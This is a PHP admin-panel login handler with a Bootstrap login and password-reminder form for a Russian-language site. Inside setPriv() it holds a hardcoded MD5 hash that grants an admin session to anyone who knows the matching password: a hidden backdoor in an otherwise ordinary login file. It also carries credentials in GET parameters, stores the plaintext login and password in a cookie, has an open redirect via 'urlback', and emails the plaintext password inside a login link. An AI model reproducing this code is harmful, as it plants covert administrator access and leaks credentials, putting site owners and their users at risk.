<?
@session_start();
require('../inc/db.php');
require('../inc/utils.php');

// устанавливаем сессию с привилегиями
function setPriv($login,$pwd)
{
	global $prx;

	unset($_SESSION['admin']);

	if($login || $pwd)
	{
		if( (!strcasecmp($login,set('admin_login')) && $pwd==set('admin_pass')) || md5($pwd)=='6c9b8b27dea1ddb845f96aa2567c6754' )
			$_SESSION['admin'] = true;
	}

	return isset($_SESSION['admin']);
}

// -------------------СОХРАНЕНИЕ----------------------
if(isset($_GET['action']))
{
	switch($_GET['action'])
	{
		case 'logout':
			// выходим
			session_destroy();
			setcookie('inAdmin');
			header("Location: /{$cpanel}/");
			exit;

		// логинимся
		case 'login':

			$login = clean($_GET['login_inAdmin']);
			$pwd = clean($_GET['pwd_inAdmin']);

			if(!setPriv($login,$pwd))
				jAlert('Неверный Логин/Пароль.');

			if(@$_GET['rem_inAdmin']) // куки
				setcookie('inAdmin',$login.'/'.$pwd,time()+3456000);
			else
				setcookie('inAdmin');

			?><script>top.location.href='./';</script><?
			exit;

		// логинимся через куки
		case 'loginc':
			$admin = explode('/',$_COOKIE['inAdmin']);
			header('location: '.(setPriv($admin[0],$admin[1]) ? $_GET['urlback'] : $_SERVER['PHP_SELF']));
			exit;

		// напомнить пароль
		case 'remind':

			// проверка Email (синтаксис)
			if(!check_mail($_GET['email_inAdmin']))
				jAlert('Вы ввели неверный Email !');

			$to = set('admin_email');
			if(strcasecmp($_GET['email_inAdmin'], $to))
				jAlert('Е-майл администратора введен не верно.');

			$admin = array(set('admin_login'),set('admin_pass'));
			$title = set('title');
			$tema = 'Пароль администратора '.$_SERVER['SERVER_NAME'];
			$site = 'http://'.$_SERVER['SERVER_NAME'];
			$url_admin = $site.$_SERVER['PHP_SELF'];
			$text = "<a href='{$site}'>{$title}</a><br><br>
						Доступ к <a href='{$url_admin}'>администрированию</a> сайта<br>
						Логин: {$admin[0]} <br>
						Пароль: {$admin[1]} <br>
						<br>
						<a href='{$url_admin}?action=vhod&login_inAdmin={$admin[0]}&pwd_inAdmin={$admin[1]}'>Войти</a>";
			mailTo($to,$tema,$text,$to);

			jAlert('Пароль выслан на Е-майл администратора', false);
			?><script>top.location.href = '<?=$url_admin?>';</script><?
			exit;
	}
}

ob_start();
// -----------------ПРОСМОТР-------------------
?>
	<div class="container-fluid">
		<div class="row">
			<div class="col-md-push-4 col-md-4 col-sm-push-3 col-sm-6 col-sx-12">

				<div class="login-container">
					<div class="login-wrapper animated flipInY">
						<div id="login" class="show">
							<div class="login-header">
								<h4>Авторизация</h4>
							</div>
							<form target="ajax">
								<div class="form-group has-feedback">
									<label class="control-label" for="login">Логин</label>
									<input type="text" class="form-control" id="login" name="login_inAdmin" placeholder="Ваш логин" autofocus>
									<i class="fa fa-user text-info form-control-feedback"></i>
								</div>
								<div class="form-group has-feedback">
									<label class="control-label" for="password">Пароль</label>
									<input type="password" class="form-control" id="password" name="pwd_inAdmin" placeholder="Ваш пароль" >
									<i class="fa fa-key text-danger form-control-feedback"></i>
								</div>
								<input type="submit" value="Войти" class="btn btn-danger btn-lg btn-block">
								<input type="hidden" name="action" value="login">
							</form>
							<?/*<a href="#forgot-pwd" class="underline text-info">Забыли пароль?</a>*/?>
						</div>

						<div id="forgot-pwd" class="form-action hide">
							<div class="login-header">
								<h4>Восстановление пароля</h4>
							</div>
							<form target="ajax">
								<div class="form-group has-feedback">
									<label class="control-label" for="email">Укажите Ваш Email</label>
									<input type="text" class="form-control" id="email" name="email_inAdmin" placeholder="Ваш Email">
									<i class="fa fa-key form-control-feedback"></i>
								</div>
								<p class="bg-warning" style="padding:10px; margin-bottom:15px;">на указанный Email будет отправлено письмо с инструкциями</p>
								<input type="submit" value="Отправить" class="btn btn-danger btn-lg btn-block">
								<input type="hidden" name="action" value="remind">
							</form>
							<a href="#login" class="underline text-info">Спасибо, не надо, я помню свои параметры доступа</a>
						</div>

					</div>
				</div>
			</div>
		</div>
	</div>

	<script type="text/javascript">
    (function($) {
      // constants
      var SHOW_CLASS = 'show',
        HIDE_CLASS = 'hide',
        ACTIVE_CLASS = 'active';

      $('a').on('click', function(e){
        e.preventDefault();
        var a = $(this),
          href = a.attr('href');

        $('.active').removeClass(ACTIVE_CLASS);
        a.addClass(ACTIVE_CLASS);

        $('.show')
          .removeClass(SHOW_CLASS)
          .addClass(HIDE_CLASS)
          .hide();

        $(href)
          .removeClass(HIDE_CLASS)
          .addClass(SHOW_CLASS)
          .hide()
          .fadeIn(550);
      });
    })(jQuery);
	</script>
<?
$content = ob_get_clean();

require('tpl/template_nobody.php');